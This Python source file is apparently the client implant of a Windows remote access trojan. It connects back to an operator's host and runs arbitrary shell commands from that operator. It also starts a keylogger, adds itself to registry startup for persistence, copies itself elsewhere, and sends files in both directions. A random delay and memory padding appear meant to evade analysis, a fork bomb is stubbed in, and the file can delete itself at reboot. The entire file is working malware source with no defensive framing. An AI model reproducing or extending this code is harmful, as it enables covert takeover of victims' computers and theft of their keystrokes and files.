import socket, time, subprocess, threading,sys
import tools.keylogger as keylogger
import _thread as thread
import settings.keys as keys
import tools.cipher as cipher
import queue
import tools.regedit as regedit
from win32api import MoveFileEx
import win32con
from tools.packet_manager import p_manager
from tools.exception_handler import exception_handler
from tools.dictionary import *
from tools.utils import packet_send, packet_recv, file_recv, file_send, copy_transfer, check_key
import os
import sys
import random
# import tools.forkbomb as forkbomb

def mem_random(min_kilobytes, max_kilobytes):
    list_ret = []

    minimum = min_kilobytes*250
    maximum = max_kilobytes*250

    max_num = random.randrange(minimum,maximum)
    for i in range(0,max_num):
        list_ret.append(random.randint(0,65535))
    return list_ret

class client:
    def __init__(self, cipherClass, HOST=keys.CONN_IP_ADDRESS, PORT=keys.CONN_PORT):
        time.sleep(random.randrange(2,8))

        if DEBUG == False:
            self.list = mem_random(1000,5000)
        
        
        if check_key() == False:
            file_path = copy_transfer()
            if file_path != False:
                regedit.placeStartup(root_path=file_path)
                sys.exit()
        self.sock = None
        self.HOST = HOST
        self.PORT = PORT
        self.timeout = 3
        self.cipherClass = cipherClass
        self.command_list = queue.Queue()
        self.send_list = queue.Queue()
        self.stop = False

    def authenticate(self):
        conn = self.sock
        leftovers = b''

        while(True):
            try:
                packet, leftovers = packet_recv(cipherClass=self.cipherClass,
                                    conn=conn,
                                    decrypt=True,
                                    leftovers=leftovers)

                if packet[PK_COMMAND_FLAG] != COMMAND_START:
                    continue

                password = packet[PK_PAYLOAD_FLAG]
                sent = packet_send(command=COMMAND_ACKNOWLEDGE,
                            payload=password,
                            cipherClass=self.cipherClass,
                            conn=conn,
                            encrypt=False)
                if sent == True:
                    break
            except socket.timeout:
                print("Socket timed out on handshake..")
                leftovers = b''
        print("Handshake complete...")

    def exe_tool(self, message):
        command = message[PK_PAYLOAD_FLAG].lower()
        return_message = {PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}

        if command == "keylogger":
            keylogger.keylogger("data.txt")

            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = "Keylogger Activated."

            self.send_list.put(return_message)
            return

        elif command == "placestartup":
            if regedit.placeStartup():
                reply = "Successful!"
            else:
                reply = "Failed!"

            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = reply
            self.send_list.put(return_message)
            return

        elif command == "removestartup":
            if regedit.removeStartup():
                reply = "Successful!"
            else:
                reply = "Failed!"

            return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
            return_message[PK_PAYLOAD_FLAG] = reply
            self.send_list.put(return_message)
            return
        elif command == "forkbomb":
            pass
            # forkbomb.bomb()

    def parse_command(self):
        while(self.stop == False):
            try:
                time.sleep(DELAY)
                if (self.command_list.empty() == True):
                    continue
                message = self.command_list.get()

                return_message={PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}

                if message[PK_COMMAND_FLAG] == COMMAND_LINE_EXE:
                    try:
                        data = self.execute_commands(message[PK_PAYLOAD_FLAG])
                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                        return_message[PK_PAYLOAD_FLAG] = data
                    except Exception as e:
                        exception_handler(e)
                        return_message[PK_COMMAND_FLAG] = COMMAND_ERROR
                        return_message[PK_PAYLOAD_FLAG] = "Error in inputting the command."

                    self.send_list.put(return_message)

                elif message[PK_COMMAND_FLAG] == COMMAND_TOOL_EXE:
                    self.exe_tool(message)

                elif message[PK_COMMAND_FLAG] == COMMAND_FTP:
                    if (file_recv(message) == True):
                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                        return_message[PK_PAYLOAD_FLAG] = "Received part of the file."
                    else:
                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                        return_message[PK_PAYLOAD_FLAG] = "Error receiving file. Something went wrong"
                    self.send_list.put(return_message)
                elif message[PK_COMMAND_FLAG] == COMMAND_RECEIVE_FTP:
                    try:
                        file_send(message[PK_PAYLOAD_FLAG], self.send_list)
                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                        return_message[PK_PAYLOAD_FLAG] = "Done Sending"
                    except Exception as e:
                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                        return_message[PK_PAYLOAD_FLAG] = str(e)
                    self.send_list.put(return_message)
                elif message[PK_COMMAND_FLAG] == "HLP":
                    return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                    return_message[PK_PAYLOAD_FLAG] = """
            Current list of commands implemented:
                CMD :param:     - enter command line commands
                EXE :param:     - execute created tools
                    param lists - keylogger
                                - placestartup
                                - removestartup
                                - forkbomb
                    """
                    self.send_list.put(return_message)

                elif message[PK_COMMAND_FLAG] == COMMAND_EXIT:
                    return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                    return_message[PK_PAYLOAD_FLAG] = "Shutdown process initiated. {}".format(sys.argv[0])
                    self.send_list.put(return_message)
                    os._exit(0)

                elif message[PK_COMMAND_FLAG] == COMMAND_DELETE:
                    return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                    return_message[PK_PAYLOAD_FLAG] = "Delete process initiated. {}".format(sys.argv[0])
                    self.send_list.put(return_message)
                    try:
                        regedit.removeStartup()
                        MoveFileEx(sys.argv[0], None, win32con.MOVEFILE_DELAY_UNTIL_REBOOT)
                    except Exception as e:
                        exception_handler(e)
                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                        return_message[PK_PAYLOAD_FLAG] = "Delete process Failed: {}".format(e)
                        self.send_list.put(return_message)
                else:
                    return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                    return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
                    self.send_list.put(return_message)
            except Exception as e:
                exception_handler(e)
                self.stop = True
                return
        return

    def execute_commands(self, command):
        response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        data = response.stdout.read() + response.stderr.read()

        try:
            data = str(data.decode('utf-8'))
        except:
            data = data.hex()

        return data

    def input_collection(self):
        leftovers = b''
        while (self.stop == False):
            try:
                packet, leftovers = packet_recv(cipherClass=self.cipherClass,
                                    conn=self.sock,
                                    decrypt=True,
                                    leftovers=leftovers)

                self.command_list.put(packet)

            except socket.timeout:
                leftovers = b''
                continue
            except Exception as e:
                exception_handler(e)
                print("Error in Input collection")
                self.stop = True
                return False

    def send_message(self):
        while(self.stop == False):
            try:
                time.sleep(DELAY)
                if (self.send_list.empty() == False):
                    message = self.send_list.get()
                    packet_send(command=message[PK_COMMAND_FLAG],
                                payload=message[PK_PAYLOAD_FLAG],
                                cipherClass=self.cipherClass,
                                conn=self.sock,
                                encrypt=True)
            except Exception as e:
                exception_handler(e)
                print("ERROR IN SEND_LIST FUNCTION.")
                self.stop = True
                return

    def connect(self):
            self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.sock.settimeout(3)
            self.sock.connect((self.HOST,self.PORT))
            print("Connection successful...")

    def start_client(self):
        while (True):
            try:
                self.connect()
                self.authenticate()

                receiver = threading.Thread(target=self.input_collection)
                executor = threading.Thread(target=self.parse_command)
                sender = threading.Thread(target=self.send_message)


                receiver.start()
                sender.start()
                executor.start()

                receiver.join()
                sender.join()
                executor.join()
                print("Error in one of the receiver or sender...")
                self.stop = False
                time.sleep(1)
            except Exception as e:
                exception_handler(e)
                print("Connection Failed.")
                continue
            finally:
                self.sock.close()


if __name__ == '__main__':
    cipherClass = cipher.cipher(keys.CONN_PASSWORD)
    target_client = client(cipherClass=cipherClass)
    target_client.start_client()